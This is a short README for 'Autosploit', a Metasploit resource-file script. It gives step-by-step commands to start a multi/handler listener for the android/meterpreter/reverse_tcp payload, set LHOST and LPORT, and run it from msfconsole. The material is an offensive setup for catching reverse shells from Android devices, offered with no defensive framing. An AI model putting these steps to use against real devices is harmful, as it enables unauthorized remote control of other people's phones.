# Autosploit

This is a script that allows you to automate Metasploit using simple process.....

## Changes Needed

You need to change the file for your work

First you need to change the First Line for your work. For example I have used:
```
use multi/handler
```

Change the payload. Here for example I have used: 
```
android/meterpreter/reverse_tcp
```
Then change LHOST to your IP by typing ``` ifconfig ``` or ```sudo ifconfig```.

```
set LHOST <Your IP>
```
Then add the PORT. You can give any PORT number
```
set LPORT <Your PORT>
```
And now I have written ``` exploit``` to exploit the payload.

## Run Automate Script

For running the automate script you need to type ```msfconsole``` as usual. THen after Msfconsole loaded type ```resource <location of the file>```. Here inthe place of 
```<location of the file>``` type the file locatio with file name.
## Happy Hacking
